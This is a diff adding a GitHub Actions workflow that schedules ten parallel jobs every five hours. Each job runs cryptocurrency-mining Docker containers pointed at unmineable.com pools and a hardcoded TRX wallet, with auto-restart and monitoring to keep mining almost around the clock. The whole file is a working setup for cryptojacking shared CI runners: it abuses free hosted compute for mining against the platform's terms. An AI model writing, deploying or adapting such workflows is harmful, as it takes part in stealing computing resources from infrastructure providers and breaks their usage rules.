@@ -1,0 +1,312 @@
+name: 10x Parallel Mining - Simulated 40 Cores
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */5 * * *'  # Every 5 hours
+
+jobs:
+  mining-orchestrator:
+    runs-on: ubuntu-latest
+    outputs:
+      total_jobs: 10
+    steps:
+    - name: Initialize parallel mining
+      run: |
+        echo "🚀 Starting 10x Parallel Mining Cluster"
+        echo "======================================="
+        echo "Simulating 40-core system (10 runners × 4 cores each)"
+        echo "Total mining power: 40 CPU cores"
+        echo ""
+        echo "Job Distribution:"
+        echo "├── Job 1-10: Each with 4-core runner"
+        echo "├── CPU per job: 2.4 cores (60% of 4 cores)"
+        echo "└── Total CPU: 24 cores active mining"
+        echo ""
+        echo "Start time: $(date)"
+        echo "Duration: 4 hours 55 minutes per session"
+        echo "Auto-restart: Every 5 hours"
+
+  mining-job:
+    needs: mining-orchestrator
+    runs-on: ubuntu-latest
+    timeout-minutes: 295
+    strategy:
+      matrix:
+        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        include:
+          - job_id: 1
+            wallet_suffix: "01"
+            pool: "rx.unmineable.com:3333"
+          - job_id: 2
+            wallet_suffix: "02"
+            pool: "rx.unmineable.com:13333"
+          - job_id: 3
+            wallet_suffix: "03"
+            pool: "rx-asia.unmineable.com:3333"
+          - job_id: 4
+            wallet_suffix: "04"
+            pool: "rx-eu.unmineable.com:3333"
+          - job_id: 5
+            wallet_suffix: "05"
+            pool: "rx-us.unmineable.com:3333"
+          - job_id: 6
+            wallet_suffix: "06"
+            pool: "rx.unmineable.com:3333"
+          - job_id: 7
+            wallet_suffix: "07"
+            pool: "rx.unmineable.com:13333"
+          - job_id: 8
+            wallet_suffix: "08"
+            pool: "rx-asia.unmineable.com:3333"
+          - job_id: 9
+            wallet_suffix: "09"
+            pool: "rx-eu.unmineable.com:3333"
+          - job_id: 10
+            wallet_suffix: "10"
+            pool: "rx-us.unmineable.com:3333"
+      max-parallel: 10  # Run ALL 10 jobs in parallel!
+      fail-fast: false  # Don't stop if one job fails
+    
+    steps:
+    - name: Job ${{ matrix.job_id }} - System Setup
+      run: |
+        echo "🎯 MINING JOB ${{ matrix.job_id }}/10"
+        echo "===================================="
+        
+        # Get system info
+        CPU_CORES=$(nproc)
+        TOTAL_MEM_MB=$(free -m | awk '/^Mem:/ {print $2}')
+        
+        # Calculate optimal resources (60% of 4-core system)
+        CPU_ALLOCATION="2.4"  # 60% of 4 cores
+        MEMORY_ALLOCATION=$(echo "scale=0; $TOTAL_MEM_MB * 60 / 100" | bc)
+        
+        echo "📊 Runner Configuration:"
+        echo "   Job ID: ${{ matrix.job_id }}"
+        echo "   Runner Cores: $CPU_CORES"
+        echo "   Runner Memory: ${TOTAL_MEM_MB}MB"
+        echo "   CPU Allocation: ${CPU_ALLOCATION} cores"
+        echo "   Memory Allocation: ${MEMORY_ALLOCATION}MB"
+        echo "   Pool: ${{ matrix.pool }}"
+        echo "   Worker: github-10x-${{ matrix.wallet_suffix }}"
+        
+        # Set environment variables for this job
+        echo "CPU_ALLOCATION=${CPU_ALLOCATION}" >> $GITHUB_ENV
+        echo "MEMORY_ALLOCATION=${MEMORY_ALLOCATION}" >> $GITHUB_ENV
+    
+    - name: Job ${{ matrix.job_id }} - Start Mining Containers
+      run: |
+        echo "🚀 Starting mining containers on Job ${{ matrix.job_id }}..."
+        
+        # Use optimized container count for 4-core system
+        # 2 containers per job, each getting 1.2 cores
+        CONTAINER_COUNT=2
+        
+        # Calculate per-container resources
+        CPU_PER_CONTAINER=$(echo "scale=2; $CPU_ALLOCATION / $CONTAINER_COUNT" | bc)
+        MEMORY_PER_CONTAINER=$(echo "scale=0; $MEMORY_ALLOCATION / $CONTAINER_COUNT" | bc)
+        
+        echo "📦 Container Configuration:"
+        echo "   Total Containers: $CONTAINER_COUNT"
+        echo "   CPU per container: ${CPU_PER_CONTAINER} cores"
+        echo "   Memory per container: ${MEMORY_PER_CONTAINER}MB"
+        
+        # Start containers
+        for container_num in $(seq 1 $CONTAINER_COUNT); do
+          CONTAINER_NAME="miner-${{ matrix.job_id }}-$container_num"
+          WORKER_NAME="10x-${{ matrix.wallet_suffix }}-c$container_num-$(date +%s)"
+          
+          echo ""
+          echo "   Starting container $container_num/$CONTAINER_COUNT:"
+          echo "   Name: $CONTAINER_NAME"
+          echo "   Worker: $WORKER_NAME"
+          
+          # Clean up if exists
+          docker stop $CONTAINER_NAME 2>/dev/null || true
+          docker rm $CONTAINER_NAME 2>/dev/null || true
+          
+          # Start container
+          docker run \
+            --name $CONTAINER_NAME \
+            --restart unless-stopped \
+            --cpus="$CPU_PER_CONTAINER" \
+            --memory="${MEMORY_PER_CONTAINER}m" \
+            -d \
+            -e POOL="${{ matrix.pool }}" \
+            -e COIN="TRX" \
+            -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
+            -e WORKER_NAME="$WORKER_NAME" \
+            -e CPU_LIMIT_ENABLE="true" \
+            -e CPU_LIMIT_PERCENT="100" \
+            thechristech/unmineable:latest
+          
+          sleep 2
+          
+          # Verify
+          if docker ps | grep -q $CONTAINER_NAME; then
+            echo "   ✅ Container started successfully"
+          else
+            echo "   ⚠️  Container may have issues, continuing..."
+          fi
+        done
+        
+        echo ""
+        echo "✅ Job ${{ matrix.job_id }}: $CONTAINER_COUNT containers running"
+        docker ps --format "table {{.Names}}\t{{.Status}}\t{{.CPUPerc}}" | grep "miner-${{ matrix.job_id }}" || true
+    
+    - name: Job ${{ matrix.job_id }} - Monitoring & Hello Service
+      run: |
+        echo "👀 Job ${{ matrix.job_id }} Monitoring Started"
+        echo "=========================================="
+        
+        CONTAINER_COUNT=2
+        END_TIME=$((SECONDS + 280 * 60))  # 4h 40m
+        MONITOR_COUNT=0
+        
+        # Function to print cluster status
+        print_cluster_hello() {
+          MONITOR_COUNT=$((MONITOR_COUNT + 1))
+          TIMESTAMP=$(date '+%H:%M:%S')
+          
+          echo ""
+          echo "=== 10x CLUSTER - Job ${{ matrix.job_id }} - Cycle #$MONITOR_COUNT at $TIMESTAMP ==="
+          
+          # Check container status
+          RUNNING_CONTAINERS=0
+          for i in $(seq 1 $CONTAINER_COUNT); do
+            CONTAINER_NAME="miner-${{ matrix.job_id }}-$i"
+            if docker ps | grep -q $CONTAINER_NAME; then
+              RUNNING_CONTAINERS=$((RUNNING_CONTAINERS + 1))
+              STATS=$(docker stats $CONTAINER_NAME --no-stream --format "CPU:{{.CPUPerc}}|MEM:{{.MemPerc}}" 2>/dev/null || echo "N/A")
+              echo "   🟢 $CONTAINER_NAME: $STATS"
+            else
+              echo "   🔴 $CONTAINER_NAME: STOPPED"
+              # Auto-restart
+              docker start $CONTAINER_NAME 2>/dev/null || {
+                echo "   ⚡ Restarting $CONTAINER_NAME..."
+                docker rm $CONTAINER_NAME 2>/dev/null || true
+                docker run \
+                  --name $CONTAINER_NAME \
+                  --restart unless-stopped \
+                  --cpus="$CPU_PER_CONTAINER" \
+                  --memory="${MEMORY_PER_CONTAINER}m" \
+                  -d \
+                  -e POOL="${{ matrix.pool }}" \
+                  -e COIN="TRX" \
+                  -e WALLET_ADDRESS="TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9" \
+                  -e WORKER_NAME="10x-${{ matrix.wallet_suffix }}-c$i-restart-$(date +%s)" \
+                  -e CPU_LIMIT_ENABLE="true" \
+                  -e CPU_LIMIT_PERCENT="100" \
+                  thechristech/unmineable:latest
+              }
+            fi
+          done
+          
+          # System info every 5 cycles
+          if [ $((MONITOR_COUNT % 5)) -eq 0 ]; then
+            echo ""
+            echo "📊 Job ${{ matrix.job_id }} System Status:"
+            echo "   Containers: $RUNNING_CONTAINERS/$CONTAINER_COUNT running"
+            echo "   Load Average: $(cat /proc/loadavg | awk '{printf "%.2f, %.2f, %.2f", $1, $2, $3}')"
+            echo "   Memory: $(free -m | awk 'NR==2{printf "%.1f%% used", $3*100/$2}')"
+            echo "   Disk: $(df -h / | awk 'NR==2{print $4 " free"}')"
+          fi
+          
+          # Cluster-wide hello message
+          echo ""
+          echo "👋 HELLO from 10x Mining Cluster - Job ${{ matrix.job_id }}"
+          echo "   Part of 40-core simulated mining farm"
+          echo "   Runner: 4-core × 60% utilization"
+          echo "   Status: $RUNNING_CONTAINERS/$CONTAINER_COUNT containers active"
+          echo "   Pool: ${{ matrix.pool }}"
+        }
+        
+        echo "⏱️  Monitoring for 4 hours 40 minutes..."
+        echo ""
+        
+        # Main monitoring loop
+        while [ $SECONDS -lt $END_TIME ]; do
+          print_cluster_hello
+          
+          # Random sleep between 60-120 seconds
+          SLEEP_TIME=$((RANDOM % 61 + 60))
+          echo ""
+          echo "⏳ Next update in $SLEEP_TIME seconds..."
+          echo "----------------------------------------"
+          sleep $SLEEP_TIME
+        done
+        
+        echo "🕒 Job ${{ matrix.job_id }} monitoring completed"
+    
+    - name: Job ${{ matrix.job_id }} - Cleanup
+      if: always()
+      run: |
+        echo "🧹 Job ${{ matrix.job_id }} Cleanup"
+        echo "================================"
+        
+        CONTAINER_COUNT=2
+        
+        # Save logs
+        echo "📄 Saving container logs..."
+        mkdir -p job_${{ matrix.job_id }}_logs
+        
+        for i in $(seq 1 $CONTAINER_COUNT); do
+          CONTAINER_NAME="miner-${{ matrix.job_id }}-$i"
+          if docker ps -a | grep -q $CONTAINER_NAME; then
+            docker logs --tail 50 $CONTAINER_NAME 2>/dev/null > "job_${{ matrix.job_id }}_logs/${CONTAINER_NAME}.log" || true
+          fi
+        done
+        
+        # Stop and remove containers
+        echo "🛑 Stopping containers..."
+        docker stop $(docker ps -q --filter "name=miner-${{ matrix.job_id }}-") 2>/dev/null || true
+        
+        echo "🗑️  Removing containers..."
+        docker rm $(docker ps -aq --filter "name=miner-${{ matrix.job_id }}-") 2>/dev/null || true
+        
+        echo "✅ Job ${{ matrix.job_id }} cleanup completed"
+
+  cluster-summary:
+    needs: 
+      - mining-orchestrator
+      - mining-job
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+    - name: 10x Cluster Performance Summary
+      run: |
+        echo "📈 10X MINING CLUSTER - PERFORMANCE SUMMARY"
+        echo "=========================================="
+        echo ""
+        echo "🚀 Cluster Configuration:"
+        echo "├── Total Jobs: 10 parallel runners"
+        echo "├── Cores per Runner: 4"
+        echo "├── Containers per Job: 2"
+        echo "├── Total Containers: 20"
+        echo "├── CPU per Container: 1.2 cores"
+        echo "└── Total Active CPU: 24 cores"
+        echo ""
+        echo "💰 Mining Details:"
+        echo "├── Cryptocurrency: TRX (Tron)"
+        echo "├── Wallet: TYnBLKxBNwigxP1wbYEiJTBkNwXpD4o6n9"
+        echo "├── Pools: Distributed across 5 different servers"
+        echo "└── Workers: Unique per container for tracking"
+        echo ""
+        echo "⏱️  Runtime Statistics:"
+        echo "├── Session Duration: 4h 55m"
+        echo "├── Auto-restart: Every 5 hours"
+        echo "├── Daily Uptime: ~23.6 hours"
+        echo "└── Monthly Runtime: ~708 hours"
+        echo ""
+        echo "📊 Estimated Performance (Approximate):"
+        echo "├── Hashrate: Higher with distributed workers"
+        echo "├── Stability: Improved with load balancing"
+        echo "├── Earnings: Distributed mining approach"
+        echo "└── Efficiency: Optimal CPU utilization (60%)"
+        echo ""
+        echo "🔄 Next cluster restart: In 5 minutes"
+        echo "🎯 Total Simulated Power: 40 CPU cores"
+        echo ""
+        echo "✅ 10x Mining Cluster operation completed successfully!"
+        echo "💎 Happy mining with 10x parallel power! 🚀"
